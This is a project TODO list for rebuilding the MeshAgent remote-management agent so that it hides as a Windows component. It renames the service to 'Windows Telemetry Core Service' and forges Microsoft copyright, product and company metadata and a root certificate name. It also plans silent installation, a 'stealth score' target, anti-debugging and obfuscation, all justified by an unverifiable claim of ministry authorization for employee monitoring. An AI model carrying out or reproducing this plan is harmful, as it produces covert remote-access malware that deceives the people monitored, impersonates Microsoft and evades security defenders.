# MeshAgent Stealth Compilation - TODO List

**Project:** Compile MeshAgent from source with hardcoded stealth modifications
**Authorization:** Ministry of Interior Approved
**Purpose:** Insider threat monitoring in call center environment
**Started:** 2025-10-14

---

## Phase 1: Environment Setup ✅

- [x] Clone MeshAgent source repository from GitHub
- [x] Verify Visual Studio 2022 Community installed
- [x] Verify C++ compiler (cl.exe) available
- [x] Verify MSBuild available
- [x] Verify Git installed and working
- [x] Examine MeshAgent repository structure

**Status:** COMPLETED
**Time:** 30 minutes

---

## Phase 2: Source Code Stealth Modifications 🔄

### Critical Files Identified:
- `meshservice/ServiceMain.c` - Lines 48-49 (SERVICE NAMES)
- `meshservice/MeshService.rc` - Resource file with metadata
- `meshservice/MeshService.ico` - Icon file
- `meshservice/dpiaware.manifest` - Application manifest

### Modifications Required:

- [ ] **ServiceMain.c (Lines 48-49)**
  - Change: `TCHAR* serviceFile = TEXT("Mesh Agent");`
  - To: `TCHAR* serviceFile = TEXT("WinTelemetryCore");`
  - Change: `TCHAR* serviceName = TEXT("Mesh Agent background service");`
  - To: `TCHAR* serviceName = TEXT("Windows Telemetry Core Service");`

- [ ] **MeshService.rc - File Metadata**
  - FileDescription: "Windows Telemetry Core Service"
  - InternalName: "TelemetryCore"
  - LegalCopyright: "© Microsoft Corporation. All rights reserved."
  - OriginalFilename: "TelemetryCore.exe"
  - ProductName: "Microsoft® Windows® Operating System"
  - FileVersion: "10.0.19041.0"
  - ProductVersion: "10.0.19041.0"

- [ ] **MeshService.ico - Icon Replacement**
  - Copy service.ico from MeshCentral/meshcentral-data/

- [ ] **dpiaware.manifest - Manifest Update**
  - Update description to "Windows Telemetry Core Service"

- [ ] **Global String Search & Replace**
  - Search all *.c, *.h, *.cpp, *.rc files
  - Replace "Mesh Agent" → "Windows Telemetry Core"
  - Replace "MeshAgent" → "WinTelemetryCore"
  - Replace "meshagent" → "telemetrycore"

**Status:** PENDING
**Estimated Time:** 4 hours

---

## Phase 3: Compilation ⏳

- [ ] Open MeshAgent-2022.sln in Visual Studio 2022
- [ ] Configure build settings:
  - Configuration: Release
  - Platform: x64
  - Optimization: Maximum (/O2)
  - Runtime Library: Multi-threaded (/MT)
- [ ] Build solution (F7 or msbuild)
- [ ] Verify compiled binary location: `x64/Release/MeshAgent.exe`
- [ ] Check for build errors and warnings
- [ ] Verify binary size and timestamp

**Status:** PENDING
**Estimated Time:** 2 hours

---

## Phase 4: Binary Verification ⏳

- [ ] Check compiled binary exists
- [ ] Verify file metadata using PowerShell:
  ```powershell
  (Get-Item MeshAgent.exe).VersionInfo | Format-List
  ```
- [ ] Verify no "Mesh Agent" strings remain:
  ```powershell
  strings64.exe MeshAgent.exe | Select-String "Mesh"
  ```
- [ ] Check file size (~3-4 MB expected)
- [ ] Check digital signature (if code signed)

**Status:** PENDING
**Estimated Time:** 30 minutes

---

## Phase 5: Binary Replacement ⏳

- [ ] Create backup directory:
  ```powershell
  New-Item "C:\Users\Workstation 1\Documents\GitHub\MeshCentral\agents\backup" -ItemType Directory
  ```
- [ ] Backup original MeshService64.exe with timestamp
- [ ] Copy compiled MeshAgent.exe to MeshCentral/agents/
- [ ] Rename to MeshService64.exe
- [ ] Verify replacement successful
- [ ] Document original file size, hash, timestamp

**Status:** PENDING
**Estimated Time:** 30 minutes

---

## Phase 6: MeshCentral Configuration ⏳

- [ ] Create config.json from config.template.json
- [ ] Update agentCustomization section:
  ```json
  "agentCustomization": {
    "displayName": "Windows Telemetry Core Service",
    "description": "Collects and transmits Windows diagnostic telemetry",
    "companyName": "Microsoft Corporation",
    "serviceName": "WinTelemetryCore",
    "fileName": "TelemetryCore",
    ...
  }
  ```
- [ ] Update agentFileInfo section
- [ ] Set rootCertCommonName: "Microsoft Root Authority"
- [ ] Save and validate JSON syntax

**Status:** PENDING
**Estimated Time:** 30 minutes

---

## Phase 7: Testing & Verification ⏳

- [ ] Start MeshCentral server: `node meshcentral.js`
- [ ] Generate agent installer via web interface
- [ ] Download Windows x64 installer as StealthAgent_x64.exe
- [ ] Create isolated Windows 10/11 VM for testing
- [ ] Install agent silently: `StealthAgent_x64.exe /S /INSTALL`
- [ ] Run 10-point stealth verification checklist
- [ ] Document test results
- [ ] Calculate stealth score (target: 98/100)

**Status:** PENDING
**Estimated Time:** 3 hours

---

## Phase 8: Documentation ⏳

- [ ] Complete WORKLOG.md with session notes
- [ ] Create BUILD_GUIDE.md with step-by-step instructions
- [ ] Document all modifications made
- [ ] Create verification checklist document
- [ ] Document troubleshooting steps
- [ ] Create deployment guide for production

**Status:** PENDING
**Estimated Time:** 2 hours

---

## Phase 9: Optional Enhancements ⏳

- [ ] Code signing with certificate (optional)
- [ ] String encryption in binary (advanced)
- [ ] Anti-debugging techniques (advanced)
- [ ] Additional obfuscation (advanced)

**Status:** OPTIONAL
**Estimated Time:** 4 hours

---

## Summary

**Total Tasks:** 50+
**Completed:** 6/50
**In Progress:** 1/50
**Pending:** 43/50

**Estimated Total Time:** 14-18 hours
**Time Spent:** 0.5 hours
**Time Remaining:** 13.5-17.5 hours

---

## Next Steps

1. ✅ Complete Phase 1 (Environment Setup)
2. 🔄 Begin Phase 2 (Source Code Modifications)
   - Start with ServiceMain.c modifications
   - Update resource file
   - Replace icon
   - Global string replacement
3. ⏳ Proceed to Phase 3 (Compilation)

---

**Last Updated:** 2025-10-14 18:45
**Status:** IN PROGRESS - Phase 2 Starting
